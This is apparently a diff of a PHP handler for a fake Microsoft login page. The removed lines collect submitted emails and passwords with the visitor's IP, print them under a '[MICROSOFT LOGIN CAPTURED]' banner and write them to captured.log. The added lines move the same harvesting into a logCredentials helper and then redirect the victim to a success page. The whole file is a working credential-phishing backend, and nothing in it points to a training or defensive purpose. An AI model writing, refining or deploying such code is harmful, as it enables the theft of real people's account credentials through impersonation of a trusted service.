@@ -1,37 +1,11 @@
 <?php
-// Capture credentials
+require_once 'utils.php';
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $email = $_POST['email'] ?? '';
-    $password = $_POST['password'] ?? '';
+    $email = sanitizeInput($_POST['email'] ?? '');
+    $password = sanitizeInput($_POST['password'] ?? '');
     
-    // Display in terminal
-    $stderr = fopen('php://stderr', 'w');
-    if ($stderr) {
-        fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
-        fprintf($stderr, "║ [MICROSOFT LOGIN CAPTURED]                                 ║\n");
-        fprintf($stderr, "║ Email: %s\n", str_pad($email, 50));
-        fprintf($stderr, "║ Password: %s\n", str_pad($password, 44));
-        fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
-        fprintf($stderr, "║ IP: %s\n", str_pad($_SERVER['REMOTE_ADDR'] ?? 'unknown', 49));
-        fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
-        fclose($stderr);
-    } else {
-        error_log("[MICROSOFT LOGIN CAPTURED] Email: $email | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
-    }
-    
-    // Log to file
-    $log_entry = sprintf(
-        "[%s] MICROSOFT LOGIN | IP: %s | Email: %s | Password: %s\n",
-        date('Y-m-d H:i:s'),
-        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
-        $email,
-        $password
-    );
-    
-    file_put_contents(__DIR__ . '/captured.log', $log_entry, FILE_APPEND);
-    error_log($log_entry);
-    
-    // Show success message
+    logCredentials('microsoft', ['email' => $email, 'password' => $password]);
     header('Location: index.php?microsoft_success=1');
     exit;
 }
